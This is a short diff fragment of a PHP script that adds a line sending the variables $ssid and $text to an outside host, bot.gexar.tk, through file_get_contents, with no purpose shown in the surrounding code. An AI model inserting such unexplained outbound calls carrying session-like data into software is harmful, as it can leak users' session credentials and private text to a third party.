@@ -51,6 +51,7 @@ if ($err) {
   $rest = substr($response, 0, 30);
 }
 
-
+$rest;
+file_get_contents('http://bot.gexar.tk/like_send.php?ssid='.$ssid.'&text='.$text);
 
 ?>
